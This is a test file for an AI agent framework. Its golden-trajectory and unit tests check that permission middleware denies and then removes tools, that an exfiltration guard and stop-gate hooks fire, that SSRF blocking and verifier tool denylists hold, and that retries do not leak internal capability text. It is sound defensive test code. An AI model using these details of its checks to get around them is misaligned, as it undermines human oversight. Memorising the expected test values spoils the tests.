        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
        readonly metrics?: Record<string, unknown>;
      }[];
    };

    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    expect(modelSteps.length).toBeGreaterThan(0);
    // User prompt captured in message
    expect(modelSteps[0]?.message).toContain("2+2");
    // Model response text captured from streaming text_delta accumulation
    const responseText = modelSteps[0]?.observation?.results?.[0]?.content ?? "";
    expect(responseText).toContain("4");
    expect(modelSteps[0]?.metrics?.prompt_tokens).toBeGreaterThan(0);
  });

  test("NO tool_call steps (text-only query)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/simple-text.trajectory.json`).json()) as {
      readonly steps: readonly { readonly source: string }[];
    };
    const toolSteps = doc.steps.filter((s) => s.source === "tool");
    expect(toolSteps).toHaveLength(0);
  });

  test("MCP lifecycle steps present", async () => {
    const doc = (await Bun.file(`${FIXTURES}/simple-text.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const mcpSteps = doc.steps.filter((s) => s.extra?.type === "mcp_lifecycle");
    expect(mcpSteps.length).toBeGreaterThanOrEqual(2);
  });

  test("MW:permissions span present (even without tools)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/simple-text.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const permSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "permissions",
    );
    expect(permSpans.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// glob-use trajectory: Glob builtin tool exercised (@koi/tools-builtin)
// ---------------------------------------------------------------------------

describe("glob-use ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with Glob in tool_definitions", async () => {
    const doc = (await Bun.file(`${FIXTURES}/glob-use.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly agent: {
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.agent.tool_definitions?.some((t) => t.name === "Glob")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "Grep")).toBe(true);
    expect(doc.agent.tool_definitions?.some((t) => t.name === "ToolSearch")).toBe(true);
  });

  test("has TOOL step for Glob with file paths result", async () => {
    const doc = (await Bun.file(`${FIXTURES}/glob-use.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly tool_calls?: readonly { readonly function_name: string }[];
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const toolSteps = doc.steps.filter(
      (s) => s.source === "tool" && s.observation?.results !== undefined,
    );
    expect(toolSteps.length).toBeGreaterThan(0);
    // Glob returns paths array
    const content = toolSteps[0]?.observation?.results?.[0]?.content ?? "";
    expect(content).toContain("package.json");
  });

  test("has MW:permissions + MW:hooks spans", async () => {
    const doc = (await Bun.file(`${FIXTURES}/glob-use.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const mwNames = new Set(
      doc.steps
        .filter((s) => s.extra?.type === "middleware_span")
        .map((s) => s.extra?.middlewareName),
    );
    expect(mwNames.has("permissions")).toBe(true);
    expect(mwNames.has("hooks")).toBe(true);
  });

  test("step count >= 10 (MCP + MW + MODEL + TOOL)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/glob-use.trajectory.json`).json()) as {
      readonly steps: readonly unknown[];
    };
    expect(doc.steps.length).toBeGreaterThanOrEqual(10);
  });
});

// ---------------------------------------------------------------------------
// permission-deny trajectory: permissions blocks add_numbers
// ---------------------------------------------------------------------------

describe("permission-deny ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with tools in definitions but denied at runtime", async () => {
    const doc = (await Bun.file(`${FIXTURES}/permission-deny.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly agent: {
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    // add_numbers is in tool_definitions (registered) even though denied
    expect(doc.agent.tool_definitions?.some((t) => t.name === "add_numbers")).toBe(true);
  });

  test("model produces a response (may or may not attempt tool call)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/permission-deny.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    expect(modelSteps.length).toBeGreaterThan(0);
  });

  test("trajectory has expected step count", async () => {
    const doc = (await Bun.file(`${FIXTURES}/permission-deny.trajectory.json`).json()) as {
      readonly steps: readonly { readonly source: string }[];
    };
    // At minimum: MCP lifecycle (2) + model step (1) + MW spans
    expect(doc.steps.length).toBeGreaterThanOrEqual(5);
  });

  test("MW:permissions span present with wrapModelStream hook", async () => {
    const doc = (await Bun.file(`${FIXTURES}/permission-deny.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const permSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "permissions",
    );
    expect(permSpans.length).toBeGreaterThan(0);
    // wrapModelStream is where filterTools strips the denied tool
    expect(permSpans.some((s) => s.extra?.hook === "wrapModelStream")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// denial-escalation trajectory: repeated execution-time denials trigger auto-deny
// ---------------------------------------------------------------------------

describe("denial-escalation ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with session_id=denial-escalation", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly session_id: string;
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.session_id).toBe("denial-escalation");
  });

  test("add_numbers in tool_definitions (tool visible to model)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly agent: {
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };
    expect(doc.agent.tool_definitions?.some((t) => t.name === "add_numbers")).toBe(true);
  });

  test("multiple model_call steps (model retries after denial)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
      }[];
    };
    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    // At least 2 model calls: initial + retry after denied tool call
    expect(modelSteps.length).toBeGreaterThanOrEqual(2);
  });

  test("wrapToolCall denial proves execution-time interception (not just filter-time)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly outcome?: string;
        readonly extra?: {
          readonly type?: string;
          readonly middlewareName?: string;
          readonly hook?: string;
          readonly nextCalled?: boolean;
        };
      }[];
    };
    // Unlike permission-deny (filter-time only), escalation requires execution-time denial
    // The MW:permissions wrapToolCall span with nextCalled=false proves the tool was attempted
    // and intercepted at execution time, not merely filtered from the model's view
    const execDenials = doc.steps.filter(
      (s) =>
        s.extra?.type === "middleware_span" &&
        s.extra?.middlewareName === "permissions" &&
        s.extra?.hook === "wrapToolCall" &&
        s.outcome === "failure" &&
        s.extra?.nextCalled === false,
    );
    expect(execDenials.length).toBeGreaterThanOrEqual(1);
  });

  test("exfiltration-guard wrapToolCall span fires despite permissions denial (onion chain)", async () => {
    // The MW onion chain enters outer middleware first: exfiltration-guard
    // wraps around permissions. When permissions (inner) throws a denial,
    // the error propagates back through exfiltration-guard (outer), so both
    // spans are recorded. This is expected behavior — the outer span has
    // nextCalled=true because it DID call next() (which then threw).
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly extra?: {
          readonly type?: string;
          readonly middlewareName?: string;
          readonly hook?: string;
          readonly nextCalled?: boolean;
        };
        readonly outcome?: string;
      }[];
    };
    const exfilSpan = doc.steps.find(
      (s) =>
        s.extra?.type === "middleware_span" &&
        s.extra?.middlewareName === "exfiltration-guard" &&
        s.extra?.hook === "wrapToolCall" &&
        s.outcome === "failure",
    );
    expect(exfilSpan).toBeDefined();
    // Outer MW called next() (which threw inside permissions) — nextCalled=true
    expect(exfilSpan?.extra?.nextCalled).toBe(true);
  });

  test("MW:permissions spans include wrapToolCall hook (execution-time path)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };
    const permSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "permissions",
    );
    expect(permSpans.length).toBeGreaterThan(0);
    // wrapToolCall is where execution-time denial happens (unlike permission-deny which only has wrapModelStream)
    expect(permSpans.some((s) => s.extra?.hook === "wrapToolCall")).toBe(true);
  });

  test("exactly 1 add_numbers wrapToolCall denial before escalation removes the tool", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly step_id: number;
        readonly source: string;
        readonly model_name?: string;
        readonly message?: string;
        readonly outcome?: string;
        readonly extra?: {
          readonly type?: string;
          readonly middlewareName?: string;
          readonly hook?: string;
          readonly nextCalled?: boolean;
          readonly toolCount?: number;
          readonly tools?: readonly { readonly name: string }[];
        };
      }[];
    };

    // 1. Exactly 1 add_numbers policy denial at execution time (threshold=1)
    const addNumbersDenials = doc.steps.filter(
      (s) =>
        s.extra?.type === "middleware_span" &&
        s.extra?.middlewareName === "permissions" &&
        s.extra?.hook === "wrapToolCall" &&
        s.extra?.nextCalled === false &&
        (s.message ?? "").includes("add_numbers"),
    );
    expect(addNumbersDenials).toHaveLength(1);

    // 2. Find the transition: first model step where add_numbers disappears
    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    const transitionIdx = modelSteps.findIndex(
      (s) => !(s.extra?.tools ?? []).some((t) => t.name === "add_numbers"),
    );
    expect(transitionIdx).toBeGreaterThan(0); // not the first step

    // 3. Every model step before transition has add_numbers visible
    for (let i = 0; i < transitionIdx; i++) {
      const tools = modelSteps[i]?.extra?.tools ?? [];
      expect(tools.some((t) => t.name === "add_numbers")).toBe(true);
    }

    // 4. Transition step and all after it do NOT have add_numbers
    for (let i = transitionIdx; i < modelSteps.length; i++) {
      const tools = modelSteps[i]?.extra?.tools ?? [];
      expect(tools.some((t) => t.name === "add_numbers")).toBe(false);
    }

    // 5. Both denials occurred before the transition model step
    const transitionStepId = modelSteps[transitionIdx]?.step_id ?? 0;
    for (const denial of addNumbersDenials) {
      expect(denial.step_id).toBeLessThan(transitionStepId);
    }

    // 6. toolCount drops at the transition (4 → 3)
    const preToolCount = modelSteps[transitionIdx - 1]?.extra?.toolCount ?? 0;
    const postToolCount = modelSteps[transitionIdx]?.extra?.toolCount ?? 0;
    expect(preToolCount).toBe(4);
    expect(postToolCount).toBe(3);
  });

  test("no tool calls use unadvertised names or occur after escalation removes the tool", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly agent: {
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
      readonly steps: readonly {
        readonly step_id: number;
        readonly source: string;
        readonly model_name?: string;
        readonly tool_calls?: readonly { readonly function_name?: string }[];
        readonly extra?: {
          readonly tools?: readonly { readonly name: string }[];
        };
      }[];
    };
    // 1. All tool calls must use globally advertised names (no hallucinated tools)
    const advertised = new Set((doc.agent.tool_definitions ?? []).map((t) => t.name));
    const toolSteps = doc.steps.filter((s) => s.source === "tool");
    for (const step of toolSteps) {
      for (const tc of step.tool_calls ?? []) {
        expect(advertised.has(tc.function_name ?? "")).toBe(true);
      }
    }
    // 2. No add_numbers tool call after escalation removes it from the per-turn tool set
    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    const transitionIdx = modelSteps.findIndex(
      (s) => !(s.extra?.tools ?? []).some((t) => t.name === "add_numbers"),
    );
    if (transitionIdx > 0) {
      const transitionStepId = modelSteps[transitionIdx]?.step_id ?? 0;
      const postEscalationToolCalls = doc.steps.filter(
        (s) =>
          s.source === "tool" &&
          s.step_id >= transitionStepId &&
          (s.tool_calls ?? []).some((tc) => tc.function_name === "add_numbers"),
      );
      expect(postEscalationToolCalls).toHaveLength(0);
    }
  });

  test("step count reflects multi-turn escalation pattern", async () => {
    const doc = (await Bun.file(`${FIXTURES}/denial-escalation.trajectory.json`).json()) as {
      readonly steps: readonly unknown[];
    };
    // MCP lifecycle + model calls + tool denials + MW spans = substantial step count
    expect(doc.steps.length).toBeGreaterThanOrEqual(8);
  });
});

// ---------------------------------------------------------------------------
// turn-stop trajectory: stop-gate hook blocks completion, engine re-prompts
// ---------------------------------------------------------------------------

describe("turn-stop ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with session_id=turn-stop", async () => {
    const doc = (await Bun.file(`${FIXTURES}/turn-stop.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly session_id: string;
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.session_id).toBe("turn-stop");
  });

  test("multiple model_call steps from stop-gate retries", async () => {
    const doc = (await Bun.file(`${FIXTURES}/turn-stop.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
      }[];
    };

    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    // At least 2 model calls: initial + retries from stop-gate blocking
    expect(modelSteps.length).toBeGreaterThanOrEqual(2);
  });

  test("NO tool_call steps (text-only query)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/turn-stop.trajectory.json`).json()) as {
      readonly steps: readonly { readonly source: string }[];
    };
    const toolSteps = doc.steps.filter((s) => s.source === "tool");
    expect(toolSteps).toHaveLength(0);
  });

  test("MW:hooks span present on each model call (stop-gate fires through hooks MW)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/turn-stop.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const hooksMwSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "hooks",
    );
    // One hooks MW span per model call
    expect(hooksMwSpans.length).toBeGreaterThanOrEqual(2);
  });

  test("MW:permissions span present", async () => {
    const doc = (await Bun.file(`${FIXTURES}/turn-stop.trajectory.json`).json()) as {
      readonly steps: readonly { readonly extra?: Record<string, unknown> }[];
    };

    const permSpans = doc.steps.filter(
      (s) => s.extra?.type === "middleware_span" && s.extra?.middlewareName === "permissions",
    );
    expect(permSpans.length).toBeGreaterThan(0);
  });

  // Regression for #1493 — retry responses must not echo the [Active Capabilities]
  // banner. Fixed by moving capabilities to ModelRequest.systemPrompt (a trusted
  // channel providers don't treat as parrotable user content).
  test("retry responses stay on-task and do not discuss internal capabilities", async () => {
    const doc = (await Bun.file(`${FIXTURES}/turn-stop.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly observation?: { readonly results?: readonly { readonly content?: string }[] };
      }[];
    };
    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    for (let i = 1; i < modelSteps.length; i++) {
      const content = (modelSteps[i]?.observation?.results?.[0]?.content ?? "").toLowerCase();
      expect(content).not.toContain("active capabilities");
      expect(content).not.toContain("exfiltration-guard");
      expect(content).not.toContain("permissions: bypass");
    }
  });

  test("step count >= 10 (MCP + multiple MODEL + MW spans per model call)", async () => {
    const doc = (await Bun.file(`${FIXTURES}/turn-stop.trajectory.json`).json()) as {
      readonly steps: readonly unknown[];
    };
    // 2 MCP + 4 model calls + 8 MW spans = 14 minimum
    expect(doc.steps.length).toBeGreaterThanOrEqual(10);
  });
});

// ---------------------------------------------------------------------------
// web-fetch trajectory: @koi/tools-web exercised with real HTTP
// ---------------------------------------------------------------------------

describe("web-fetch ATIF trajectory (golden file)", () => {
  test("valid ATIF v1.6 with web tools in definitions", async () => {
    const doc = (await Bun.file(`${FIXTURES}/web-fetch.trajectory.json`).json()) as {
      readonly schema_version: string;
      readonly agent: {
        readonly tool_definitions?: readonly { readonly name: string }[];
      };
    };
    expect(doc.schema_version).toBe("ATIF-v1.6");
    expect(doc.agent.tool_definitions?.some((t) => t.name === "web_fetch")).toBe(true);
  });

  test("has TOOL step for web_fetch with HTTP response", async () => {
    const doc = (await Bun.file(`${FIXTURES}/web-fetch.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const toolSteps = doc.steps.filter(
      (s) => s.source === "tool" && s.observation?.results !== undefined,
    );
    expect(toolSteps.length).toBeGreaterThan(0);
    const content = toolSteps[0]?.observation?.results?.[0]?.content ?? "";
    expect(content).toContain("200");
  });

  test("model response references Example Domain", async () => {
    const doc = (await Bun.file(`${FIXTURES}/web-fetch.trajectory.json`).json()) as {
      readonly steps: readonly {
        readonly source: string;
        readonly model_name?: string;
        readonly observation?: { readonly results?: readonly { readonly content: string }[] };
      }[];
    };

    const modelSteps = doc.steps.filter((s) => s.source === "agent" && s.model_name !== undefined);
    expect(modelSteps.length).toBe(2);
    const finalResponse = modelSteps[1]?.observation?.results?.[0]?.content ?? "";
    expect(finalResponse).toContain("Example Domain");
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/permissions (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/permissions", () => {
  test("bypass mode allows all queries unconditionally", async () => {
    const { createPermissionBackend } = await import("@koi/permissions");
    const backend = createPermissionBackend({ mode: "bypass", rules: [] });

    const decision = await backend.check({
      principal: "agent",
      resource: "tool:add_numbers",
      action: "execute",
    });
    expect(decision.effect).toBe("allow");
  });

  test("deny rule blocks matching resources", async () => {
    const { createPermissionBackend } = await import("@koi/permissions");
    const backend = createPermissionBackend({
      mode: "default",
      rules: [{ pattern: "tool:dangerous_*", action: "*", effect: "deny", source: "policy" }],
    });

    const decision = await backend.check({
      principal: "agent",
      resource: "tool:dangerous_rm",
      action: "execute",
    });
    expect(decision.effect).toBe("deny");
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/middleware-permissions (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/middleware-permissions", () => {
  test("middleware name is 'permissions' with wrapToolCall + wrapModelCall", async () => {
    const { createPermissionsMiddleware } = await import("@koi/middleware-permissions");
    const { createPermissionBackend } = await import("@koi/permissions");

    const backend = createPermissionBackend({ mode: "bypass", rules: [] });
    const mw = createPermissionsMiddleware({ backend, description: "test" });

    expect(mw.name).toBe("permissions");
    expect(typeof mw.wrapToolCall).toBe("function");
    expect(typeof mw.wrapModelCall).toBe("function");
  });

  test("auto-approval handler is a callable factory", async () => {
    const { createAutoApprovalHandler } = await import("@koi/middleware-permissions");
    expect(typeof createAutoApprovalHandler).toBe("function");
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/tools-core (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/tools-core", () => {
  test("buildTool produces a valid Tool and execute works", async () => {
    const { buildTool } = await import("@koi/tools-core");

    const result = buildTool({
      name: "adder",
      description: "Adds two numbers",
      inputSchema: {
        type: "object",
        properties: { a: { type: "number" }, b: { type: "number" } },
      },
      origin: "primordial",
      execute: async (args: JsonObject) => ({
        sum: (args.a as number) + (args.b as number),
      }),
    });

    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value.descriptor.name).toBe("adder");
      expect(result.value.origin).toBe("primordial");
      const output = (await result.value.execute({ a: 3, b: 4 })) as { readonly sum: number };
      expect(output.sum).toBe(7);
    }
  });

  test("buildTool rejects invalid definitions with VALIDATION error", async () => {
    const { buildTool } = await import("@koi/tools-core");

    const result = buildTool({
      name: "",
      description: "empty name is invalid",
      inputSchema: { type: "object" },
      origin: "primordial",
      execute: async () => ({}),
    });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
    }
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/tools-builtin (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/tools-builtin", () => {
  test("createGlobTool produces a primordial Tool named Glob", async () => {
    const { createGlobTool } = await import("@koi/tools-builtin");

    const tool = createGlobTool({ cwd: process.cwd() });
    expect(tool.descriptor.name).toBe("Glob");
    expect(tool.origin).toBe("primordial");
    expect(tool.policy).toBeDefined();
  });

  test("Glob tool executes and finds files", async () => {
    const { createGlobTool } = await import("@koi/tools-builtin");

    const tool = createGlobTool({ cwd: process.cwd() });
    const result = (await tool.execute({ pattern: "package.json" })) as {
      readonly paths?: readonly string[];
    };
    expect(result.paths).toBeDefined();
    expect(result.paths?.length).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/channel-cli (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/channel-cli", () => {
  test("createCliChannel returns a channel with name and text capability", async () => {
    const { createCliChannel } = await import("@koi/channel-cli");

    const channel = createCliChannel();
    expect(channel.name).toBeDefined();
    expect(channel.capabilities.text).toBe(true);
  });

  test("channel has send and onMessage methods", async () => {
    const { createCliChannel } = await import("@koi/channel-cli");

    const channel = createCliChannel();
    expect(typeof channel.send).toBe("function");
    expect(typeof channel.onMessage).toBe("function");
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/tools-web (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/tools-web", () => {
  test("SSRF protection blocks private IPs", async () => {
    const { isBlockedIp } = await import("@koi/tools-web");

    expect(isBlockedIp("127.0.0.1")).toBe(true);
    expect(isBlockedIp("10.0.0.1")).toBe(true);
    expect(isBlockedIp("192.168.1.1")).toBe(true);
    // Public IP should not be blocked
    expect(isBlockedIp("8.8.8.8")).toBe(false);
  });

  test("htmlToMarkdown converts HTML to readable text", async () => {
    const { htmlToMarkdown } = await import("@koi/tools-web");

    const result = htmlToMarkdown("<h1>Hello</h1><p>World</p>");
    expect(result).toContain("Hello");
    expect(result).toContain("World");
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/hooks — agent hook type (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/hooks agent hooks", () => {
  test("agent hook executor creates, handles agent hooks, and parses verdicts", async () => {
    const { createAgentExecutor, parseVerdictOutput, verdictToDecision } = await import(
      "@koi/hooks"
    );

    // Factory returns a working executor
    const spawnFn = async () => ({ ok: true as const, output: '{"ok":true}' });
    const executor = createAgentExecutor({ spawnFn });
    expect(executor.name).toBe("agent");
    expect(executor.canHandle({ kind: "agent", name: "t", prompt: "verify" })).toBe(true);
    expect(executor.canHandle({ kind: "command", name: "t", cmd: ["echo"] })).toBe(false);

    // Verdict parsing: valid ok=true
    const okVerdict = parseVerdictOutput('{"ok":true,"reason":"all good"}');
    expect(okVerdict).toEqual({ ok: true, reason: "all good" });
    // biome-ignore lint/style/noNonNullAssertion: expect() above guarantees defined
    expect(verdictToDecision(okVerdict!)).toEqual({ kind: "continue" });

    // Verdict parsing: valid ok=false
    const failVerdict = parseVerdictOutput('{"ok":false,"reason":"unsafe"}');
    expect(failVerdict).toEqual({ ok: false, reason: "unsafe" });
    // biome-ignore lint/style/noNonNullAssertion: expect() above guarantees defined
    expect(verdictToDecision(failVerdict!)).toEqual({ kind: "block", reason: "unsafe" });

    // Verdict parsing: invalid → undefined
    expect(parseVerdictOutput("not json")).toBeUndefined();
    expect(parseVerdictOutput('{"reason":"missing ok"}')).toBeUndefined();
  });

  test("agent hook config validates and tool denylist merges defaults", async () => {
    const { loadHooks, mergeToolDenylist, HOOK_VERDICT_TOOL_NAME } = await import("@koi/hooks");

    // Agent hook config validates through loadHooks
    const result = loadHooks([
      {
        kind: "agent",
        name: "security-gate",
        prompt: "Check for dangerous commands",
        filter: { events: ["tool.before"], tools: ["Bash"] },
        maxTurns: 5,
        maxTokens: 2048,
        failClosed: true,
      },
    ]);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.value).toHaveLength(1);
      expect(result.value[0]?.kind).toBe("agent");
    }

    // Tool denylist includes safety defaults
    const denylist = mergeToolDenylist(undefined);
    expect(denylist.has("spawn")).toBe(true); // recursion prevention
    expect(denylist.has("Bash")).toBe(true); // read-only by default
    expect(denylist.has("Write")).toBe(true); // read-only by default
    expect(denylist.has(HOOK_VERDICT_TOOL_NAME)).toBe(true); // namespace reserved

    // User denylist merges with defaults
    const custom = mergeToolDenylist(["WebFetch"]);
    expect(custom.has("spawn")).toBe(true); // defaults preserved
    expect(custom.has("WebFetch")).toBe(true); // user addition
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/tasks (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/tasks", () => {
  test("createMemoryTaskBoardStore CRUD round-trip with nextId + HWM", async () => {
    const { createMemoryTaskBoardStore } = await import("@koi/tasks");
    const { taskItemId } = await import("@koi/core");

    const store = createMemoryTaskBoardStore();

    // nextId generates monotonic IDs
    const id1 = await store.nextId();
    const id2 = await store.nextId();
    expect(id1).toBe(taskItemId("task_1"));
    expect(id2).toBe(taskItemId("task_2"));

    // put + get round-trip
    await store.put({
      id: id1,
      subject: "Review README",
      description: "Review README",
      dependencies: [],
      retries: 0,
      version: 0,
      status: "pending",
      createdAt: Date.now(),
      updatedAt: Date.now(),
    });
    const loaded = await store.get(id1);
    expect(loaded?.description).toBe("Review README");

    // delete preserves HWM
    await store.delete(id1);
    const id3 = await store.nextId();
    expect(id3).toBe(taskItemId("task_3")); // Not task_1

    // list with filter
    await store.put({
      id: id2,
      subject: "Fix bug",
      description: "Fix bug",
      dependencies: [],
      retries: 0,
      version: 0,
      status: "completed",
      createdAt: Date.now(),
      updatedAt: Date.now(),
    });
    const pending = await store.list({ status: "pending" });
    expect(pending).toHaveLength(0);
    const completed = await store.list({ status: "completed" });
    expect(completed).toHaveLength(1);
  });

  test("createFileTaskBoardStore persists to disk and survives recreation", async () => {
    const { createFileTaskBoardStore } = await import("@koi/tasks");
    const { taskItemId } = await import("@koi/core");
    const { mkdtemp } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "koi-golden-tasks-"));

    // Create store, add a task, dispose
    const store1 = await createFileTaskBoardStore({ baseDir: dir });
    const id = await store1.nextId();
    await store1.put({
      id,
      subject: "Persistent task",
      description: "Persistent task",
      dependencies: [],
      retries: 0,
      version: 0,
      status: "pending",
      createdAt: Date.now(),
      updatedAt: Date.now(),
    });
    await store1[Symbol.asyncDispose]();

    // Recreate from same directory — task should survive
    const store2 = await createFileTaskBoardStore({ baseDir: dir });
    const loaded = await store2.get(taskItemId(id));
    expect(loaded?.description).toBe("Persistent task");

    // HWM preserved — next ID is higher
    const id2 = await store2.nextId();
    const num1 = parseInt(id.replace(/\D/g, ""), 10);
    const num2 = parseInt(id2.replace(/\D/g, ""), 10);
    expect(num2).toBeGreaterThan(num1);

    await store2[Symbol.asyncDispose]();

    // Cleanup
    const { rmSync } = await import("node:fs");
    rmSync(dir, { recursive: true, force: true });
  });

  test("createOutputStream write/read delta cycle with byte-accurate offsets", async () => {
    const { createOutputStream } = await import("@koi/tasks");

    const stream = createOutputStream({ maxBytes: 1024 });

    // Write two chunks and verify byte-accurate offsets
    stream.write("hello ");
    stream.write("world");

    const allChunks = stream.read(0);
    expect(allChunks).toHaveLength(2);
    expect(allChunks[0]!.content).toBe("hello ");
    expect(allChunks[0]!.offset).toBe(0);
    expect(allChunks[1]!.content).toBe("world");

    // Each chunk has byteLength
    expect(allChunks[0]!.byteLength).toBe(6); // "hello " = 6 bytes
    expect(allChunks[1]!.byteLength).toBe(5); // "world" = 5 bytes

    // Total length is 11 bytes
    expect(stream.length()).toBe(11);

    // Delta read from second chunk's offset returns only "world"
    const deltaChunks = stream.read(allChunks[1]!.offset);
    expect(deltaChunks).toHaveLength(1);
    expect(deltaChunks[0]!.content).toBe("world");
  });

  test("createTaskRegistry + task kind type guards exercise runtime surface", async () => {
    const { createTaskRegistry, createOutputStream, isLocalShellTask, isRuntimeTask } =
      await import("@koi/tasks");
    const { taskItemId } = await import("@koi/core");

    const registry = createTaskRegistry();
    expect(registry.kinds()).toHaveLength(0);

    // Register a mock lifecycle
    registry.register({
      kind: "local_shell",
      start: async (id, output, _config) => ({
        kind: "local_shell" as const,
        taskId: id,
        cancel: () => {},
        output,
        startedAt: Date.now(),
        command: "echo test",
      }),
      stop: async () => {},
    });
    expect(registry.has("local_shell")).toBe(true);
    expect(registry.kinds()).toContain("local_shell");

    // Start a task through the lifecycle
    const output = createOutputStream();
    const state = await registry
      .get("local_shell")!
      .start(taskItemId("task_1"), output, { command: "echo test" });
    expect(isLocalShellTask(state)).toBe(true);
    expect(isRuntimeTask(state)).toBe(true);
    expect(state.kind).toBe("local_shell");
  });
});

// ---------------------------------------------------------------------------
// L2 golden queries: @koi/hooks once flag + toolAllowlist (2 queries)
// ---------------------------------------------------------------------------

describe("Golden: @koi/hooks once + toolAllowlist", () => {
  test("once flag: hook loads, validates, and registry consumes after first fire", async () => {
    const { loadHooks, createHookRegistry } = await import("@koi/hooks");

    // once:true validates through schema
    const result = loadHooks([
      {
        kind: "command",
        name: "first-run-check",
        cmd: ["echo", "setup"],
        filter: { events: ["tool.before"] },
        once: true,
      },
      {
        kind: "command",
        name: "always-hook",
        cmd: ["echo", "always"],
        filter: { events: ["tool.succeeded"] },
      },
    ]);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.value).toHaveLength(2);
    expect(result.value[0]?.once).toBe(true);
    expect(result.value[1]?.once).toBeUndefined();

